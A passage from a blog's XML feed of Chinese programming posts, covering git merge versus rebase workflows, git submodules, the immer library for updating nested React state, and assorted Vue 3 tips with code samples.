src="/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/img_4.png"></p></li></ul><blockquote><p>但是，master分支的历史记录有可能在bugfix分支分叉出去后有新的更新。这种情况下，要把master分支的修改内容和bugfix分支的修改内容汇合起来。<br><img src="/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/img_5.png"><br>因此，合并两个修改会生成一个提交。这时，master分支的HEAD会移动到该提交上。<br><img src="/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/img_6.png"></p></blockquote><blockquote><p>两种合并方式都可以，如果选择快速合并，需要保证每个提交都是独立且完整的，如果不满足要求，Git 支持修改提交历史，需要修改后再次合并。</p></blockquote><h2 id="合并你的开发分支"><a href="#合并你的开发分支" class="headerlink" title="合并你的开发分支"></a>合并你的开发分支</h2><p><img src="/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/img_7.png"></p><p>在合并之前，建议先将主分支新的提交合并到当前分支，有两种策略可以选择，合并和变基，合并操作更简单，变基操作提交树更清晰，建议使用变基的方式。</p><ul><li><p>合并操作的过程，命令如下：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git merge <span class="keyword">master</span></span><br><span class="line"><span class="title">$</span> git checkout <span class="keyword">master</span></span><br><span class="line"><span class="title">$</span> git merge feature/a</span><br></pre></td></tr></table></figure><p>合并操作后的提交树如下图所示：<br><img src="/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/img_8.png"></p></li><li><p>变基会修改feature&#x2F;a的历史，就像 feature&#x2F;a 是在 master 之后开发的一样，变基命令如下：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git rebase <span class="keyword">master</span></span><br><span class="line"><span class="title">$</span> git checkout <span class="keyword">master</span></span><br><span class="line"><span class="title">$</span> git merge feature/a</span><br></pre></td></tr></table></figure><p>变基操作后的提交树如下图所示，虚线的提交是feature&#x2F;a变基之前的状态，在变基后，虚线的提交不再有分支指向，但并不会删除，而是变成Git中的游离节点，在Git执行GC（垃圾清理）操作后，节点才会彻底删除。<br><img src="/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/img_9.png"></p></li></ul><h4 id="当多个开发分支时，故障分支合并"><a href="#当多个开发分支时，故障分支合并" class="headerlink" title="当多个开发分支时，故障分支合并"></a>当多个开发分支时，故障分支合并</h4><p>如果发现存在 Bug，要尽快修复，此时可以基于主分支新建故障分支，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout -b bugfix/b</span></span><br></pre></td></tr></table></figure><p>当验证没问题后，故障分支需要合并回主分支，并在主分支上发布新的补丁版本，命令如下：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout <span class="keyword">master</span></span><br><span class="line"><span class="title">$</span> git merge --no-ff bugfix/b</span><br></pre></td></tr></table></figure><p>主分支更新后，下游的公共分支要及时同步变更，建议使用变基进行同步，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout feature/a</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git rebase master</span></span><br></pre></td></tr></table></figure><p>故障分支模型如下图所示，bugfix&#x2F;b 分支合并到 master 后，feature&#x2F;a 分支进行了变基操作。</p><p><img src="/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/img_10.png"></p>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git submodule</title>
      <link href="/Blog/2022/06/15/essay/git-submodule/index/"/>
      <url>/Blog/2022/06/15/essay/git-submodule/index/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blog/2022/06/15/essay/git-submodule/index/img.png"></p><p>今天在 github 上看到一个特殊的文件夹，竟然可以直接链接别人的项目，并且可以车载本地使用！</p><blockquote><p>其实是使用了 git 的 <a href="https://git-scm.com/book/zh/v2/Git-%E5%B7%A5%E5%85%B7-%E5%AD%90%E6%A8%A1%E5%9D%97">submodule</a> 功能</p></blockquote><p>git 的 submodule 方式不会向仓库添加实际的的内容的，只会通过 .gitmodules 文件保留相应的子模块的哈希值。</p><blockquote><p>注意：<br>把一个仓库的里的子目录作为你的submodule这样的方式是不可以的。git submodule只支持整个仓库。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>提高React开发效率的神器-immer</title>
      <link href="/Blog/2022/05/25/react/%E6%8F%90%E9%AB%98React%E5%BC%80%E5%8F%91%E6%95%88%E7%8E%87%E7%9A%84%E7%A5%9E%E5%99%A8-immer/index/"/>
      <url>/Blog/2022/05/25/react/%E6%8F%90%E9%AB%98React%E5%BC%80%E5%8F%91%E6%95%88%E7%8E%87%E7%9A%84%E7%A5%9E%E5%99%A8-immer/index/</url>
      
        <content type="html"><![CDATA[<h2 id="更新复杂对象的噩梦"><a href="#更新复杂对象的噩梦" class="headerlink" title="更新复杂对象的噩梦"></a>更新复杂对象的噩梦</h2><p>在 React 类组件中，state是一个对象，当组件相对复杂时，state对象的结构可能也相当复杂。</p><p>比如</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  constructor(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="comment">// 初始化state </span></span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      name: <span class="string">&quot;freewheelLee&quot;</span>,</span><br><span class="line">      gender: <span class="string">&quot;male&quot;</span>,</span><br><span class="line">      phone: <span class="string">&quot;12345678&quot;</span>,</span><br><span class="line">      address: &#123;</span><br><span class="line">        country: &#x27;<span class="type">China</span>&#x27;,</span><br><span class="line">        city: &#123;</span><br><span class="line">          name: &#x27;<span class="type">Shanghai</span>&#x27;,</span><br><span class="line">          area: &#x27;<span class="type">PuDong</span>&#x27;,</span><br><span class="line">          postcode: <span class="number">200000</span>, <span class="comment">// 邮编号码</span></span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 其他代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如用户在这个组件中可以更改个人资料 —— 如更改某个输入框内容就能更改所在城市的地区和邮编号码, 正规的传统的标准的写法如下</p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">this.setState((prevState) =&gt; &#123;</span><br><span class="line">    <span class="attribute">return &#123;</span></span><br><span class="line"><span class="attribute">      address</span>: &#123;</span><br><span class="line">        ..<span class="variable">.prevState</span><span class="variable">.address</span>,</span><br><span class="line">        city: &#123;</span><br><span class="line">          ..<span class="variable">.prevState</span><span class="variable">.address</span><span class="variable">.city</span>,</span><br><span class="line">          area: &#x27;JingAn&#x27;,</span><br><span class="line">          postcode: prevState<span class="variable">.address</span><span class="variable">.city</span><span class="variable">.postcode</span> + 10, </span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;); </span><br></pre></td></tr></table></figure><p>为什么得这么写？</p><ul><li>React 不允许直接更改state ，而应该使用 setState</li><li>setState 会合并更改(merge update)，所以不需要手写完整的state，但是合并仅限于<strong>对象属性的第一级</strong></li><li>setState 会 **异步 **地触发re-render，所以不要直接依赖 this.state (此时的 <a href="http://this.state.xxx/">http://this.state.xxx</a> 不一定是彼时的 <a href="http://this.state.xxx/">http://this.state.xxx</a>)，即上面的写法是有潜在bug的</li><li>这三点的详细讨论可以参考React官方文档： <a href="https://reactjs.org/docs/state-and-lifecycle.html#using-state-correctly">https://reactjs.org/docs/state-and-lifecycle.html#using-state-correctly</a></li></ul><p>在上面的情景中，传统的写法已经十分繁琐了，而且有明显 代码噪音 —— 尽管代码表达的是更改 area 和 postcode 却不得不看到大量的扩展语法</p><p>更糟糕的是，容易出错 —— 每深入对象一层，扩展语法后的路径也需要再进一层(如 …prevState.address.city) ，在复制粘贴过程中弄错&#x2F;弄丢路径是屡见不鲜的。</p><p>当 state对象结构的层级更深 的时候，改动最深层的state子节点写起来会更麻烦。</p><p>另一个类似的且常见的场景是 Redux reducer</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">tag</span>Reducer = function(<span class="keyword">state</span>, action)&#123;</span><br><span class="line">      switch(action.type)&#123;</span><br><span class="line">        case UPDATE_TAG: &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                ...<span class="keyword">state</span>,</span><br><span class="line">                products: &#123;</span><br><span class="line">                    ...<span class="keyword">state</span>.products,</span><br><span class="line">                    <span class="keyword">tag</span>: &#123;</span><br><span class="line">                        ...<span class="keyword">state</span>.products.<span class="keyword">tag</span>,</span><br><span class="line">                        info: &#123;</span><br><span class="line">                           ...<span class="keyword">state</span>.products.<span class="keyword">tag</span>.info,</span><br><span class="line">                           value: action.payload</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">      // 其他代码</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么不能直接更改 reducer 的参数 state ？</p><p>reducer 必须是纯函数，不能更改参数state，而要计算并返回下一个state，所以不得不这么写。</p><blockquote><p>简单总结一下目前讨论的困境 ——</p><p>当我们需要更新某一个复杂的js对象的某个深层属性（子节点），且不允许直接更改这个js对象，单纯借助ES6展开语法导致代码非常繁琐且易出错。</p></blockquote><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>我们可以想出一个简单的解决方案 —— 先深拷贝出一个新的对象，然后直接更改新对象的属性</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.setState((prevState) =&gt; &#123;</span><br><span class="line">      const <span class="keyword">new</span><span class="type">State</span> = deepClone(prevState);</span><br><span class="line">      <span class="keyword">new</span><span class="type">State</span>.address.city.area = <span class="string">&#x27;JingAn&#x27;</span>;</span><br><span class="line">      <span class="keyword">new</span><span class="type">State</span>.address.city.postcode = <span class="keyword">new</span><span class="type">State</span>.address.city.postcode + <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span><span class="type">State</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;); </span><br></pre></td></tr></table></figure><p>但是，这种方案有明显的性能问题 —— 不管打算更新对象的哪一个属性（子节点），每次都不得不深拷贝整个对象；当对象特别大的时候，深拷贝会导致性能问题。</p><p><strong>终于到主角 immer 出场了！</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;produce&#125; <span class="keyword">from</span> <span class="string">&#x27;immer&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他代码</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">setState</span>(<span class="function">(<span class="params">prevState</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">produce</span>(prevState, <span class="function"><span class="params">draftState</span> =&gt;</span>&#123;</span><br><span class="line">      draftState.<span class="property">address</span>.<span class="property">city</span>.<span class="property">area</span> = <span class="string">&#x27;JingAn&#x27;</span>;</span><br><span class="line">      draftState.<span class="property">address</span>.<span class="property">city</span>.<span class="property">postcode</span> = draftState.<span class="property">address</span>.<span class="property">city</span>.<span class="property">postcode</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>不够香？那试试这个写法</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this.setState(produce(<span class="function"><span class="params">draftState</span> =&gt;</span> &#123;</span><br><span class="line">  draftState.address.city.<span class="built_in">area</span> = <span class="string">&quot;JingAn&quot;</span>;</span><br><span class="line">  draftState.address.city.postcode = draftState.address.city.postcode + <span class="number">10</span>;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>更重要的是，在 immer 的背后做了性能优化，而不是简单的全部深度拷贝，所以不用担心性能问题。</p><p><img src="/Blog/2022/05/25/react/%E6%8F%90%E9%AB%98React%E5%BC%80%E5%8F%91%E6%95%88%E7%8E%87%E7%9A%84%E7%A5%9E%E5%99%A8-immer/index/img.png"></p><blockquote><p>immer 还默认地把返回的新对象设置成了不可变对象，从而避免人为意外地直接修改。当然，如果不想要这个行为，可以调用 immer 的setAutoFreeze(false) 取消掉。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>为什么要使用 composition-api</title>
      <link href="/Blog/2022/05/18/vue/Vue3%E5%B0%8F%E6%8A%80%E5%B7%A7/index/"/>
      <url>/Blog/2022/05/18/vue/Vue3%E5%B0%8F%E6%8A%80%E5%B7%A7/index/</url>
      
        <content type="html"><![CDATA[<h2 id="覆盖一个-reactive-对象"><a href="#覆盖一个-reactive-对象" class="headerlink" title="覆盖一个 reactive 对象"></a>覆盖一个 reactive 对象</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">&quot;ts&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; defineComponent, reactive, onMounted &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&quot;HelloWorld&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> myReactiveObject = <span class="title function_">reactive</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>: <span class="string">&quot;Nicky&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">age</span>: <span class="string">&quot;37&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">country</span>: <span class="string">&quot;DK&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> newObject = &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>: <span class="string">&quot;Nicky Christensen&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">age</span>: <span class="string">&quot;36&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">country</span>: <span class="string">&quot;DA-DK&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//myReactiveObject = newObject // Wont work</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Object</span>.<span class="title function_">assign</span>(myReactiveObject, newObject) <span class="comment">// Will work</span></span></span><br><span class="line"><span class="language-javascript">      &#125;, <span class="number">2000</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      myReactiveObject,</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CSS-Features"><a href="#CSS-Features" class="headerlink" title="CSS Features"></a>CSS Features</h2><h4 id="将-CSS-直接绑定到你的变量"><a href="#将-CSS-直接绑定到你的变量" class="headerlink" title="将 CSS 直接绑定到你的变量"></a>将 CSS 直接绑定到你的变量</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ........</span></span><br><span class="line"><span class="keyword">const</span> color = <span class="title function_">ref</span>(<span class="string">&#x27;#f000&#x27;</span>);</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="selector-class">.text</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="attribute">color</span>: <span class="built_in">v-bind</span>(color); </span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="使用-v-global-缩写-global-应用全局样式"><a href="#使用-v-global-缩写-global-应用全局样式" class="headerlink" title="使用 v-global(缩写:global) 应用全局样式"></a>使用 v-global(缩写:global) 应用全局样式</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">// v-global</span></span><br><span class="line"><span class="language-css">:<span class="built_in">global</span>(.red) &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="使用-v-deep-缩写-deep"><a href="#使用-v-deep-缩写-deep" class="headerlink" title="使用 v-deep(缩写:deep)"></a>使用 v-deep(缩写:deep)</h4><p><code>&gt;&gt;&gt;</code> 和 <code>/deep/</code> 已弃用， <code>::v-deep</code> 已更变为（<code>::v-deep(.bar) &#123;&#125;</code>)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">// <span class="selector-class">.a</span> v-deep(<span class="selector-class">.b</span>) &#123;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.a</span> :<span class="built_in">deep</span>(.b) &#123;</span></span><br><span class="line"><span class="language-css">  <span class="comment">/* ... */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="使用-v-slotted-缩写-slotted"><a href="#使用-v-slotted-缩写-slotted" class="headerlink" title="使用 v-slotted(缩写:slotted)"></a>使用 v-slotted(缩写:slotted)</h3><p>默认情况下，从父级传入的槽内容不再受子范围样式的影响。相反，子级现在需要使用新的 ::v-slotted（） 伪元素来专门针对插槽内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">// v-slotted(<span class="selector-class">.b</span>) &#123;</span></span><br><span class="line"><span class="language-css"><span class="selector-pseudo">:slotted</span>(<span class="selector-class">.b</span>) &#123;</span></span><br><span class="line"><span class="language-css">  <span class="comment">/* ... */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="全局注册组件"><a href="#全局注册组件" class="headerlink" title="全局注册组件"></a>全局注册组件</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> MyGlobalSection <span class="keyword">from</span> <span class="string">&#x27;@/components/MyGlobalSection.vue&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="regexp">// vue2</span></span><br><span class="line"><span class="regexp">//</span> <span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="regexp">// Vue.component(MyGlobalSection.name, MyGlobalSection);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">//</span> vue3</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&quot;./App.vue&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> app = createApp(App);</span><br><span class="line">app.component(MyGlobalSection.name, MyGlobalSection);</span><br><span class="line">app.mount(<span class="string">&quot;<span class="subst">#app</span>&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="使用-v-once-or-v-memo-提升性能"><a href="#使用-v-once-or-v-memo-提升性能" class="headerlink" title="使用 v-once or v-memo 提升性能"></a>使用 v-once or v-memo 提升性能</h2><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">// v-once</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="comment">&lt;!-- single --&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-once</span>&gt;</span></span><span class="template-variable">&#123;&#123; <span class="name">someProperty</span> &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="comment">&lt;!-- with children --&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-once</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><span class="template-variable">&#123;&#123; <span class="name">someProperty</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="comment">&lt;!-- components --&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">my-component</span> <span class="attr">v-once</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="comment">&lt;!-- v-for directives --&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;”item&quot;</span> <span class="attr">in</span> <span class="attr">items</span>” <span class="attr">v-once</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">item</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v-memo</span></span><br><span class="line">&lt;<span class="keyword">div</span> v-memo=<span class="string">&quot;[valueA, valueB]&quot;</span>&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p>只有 valueA or valueB 变更的时候才会更新，值得注意的是，<strong>v-memo 不能在 v-for 使用</strong></p></blockquote><h2 id="组件的异步加载"><a href="#组件的异步加载" class="headerlink" title="组件的异步加载"></a>组件的异步加载</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineAsyncComponent &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Lazy Load</span></span><br><span class="line"><span class="keyword">const</span> myComponent = <span class="title function_">defineAsyncComponent</span>(<span class="function">() =&gt;</span></span><br><span class="line">  <span class="keyword">import</span>(<span class="string">&quot;./components/myComponent.vue&quot;</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 完整的配置</span></span><br><span class="line"><span class="keyword">const</span> myComponent = <span class="title function_">defineAsyncComponent</span>(&#123;</span><br><span class="line">  <span class="attr">loader</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;./myComponent.vue&quot;</span>),</span><br><span class="line">  <span class="attr">loadingComponent</span>: myLoadingComponent,</span><br><span class="line">  <span class="attr">errorComponent</span>: myErrorComponent,</span><br><span class="line">  <span class="attr">delay</span>: <span class="number">1000</span> <span class="comment">/* 延迟时间，在 loading component 之前*/</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">3000</span> <span class="comment">/* 超时时间 */</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
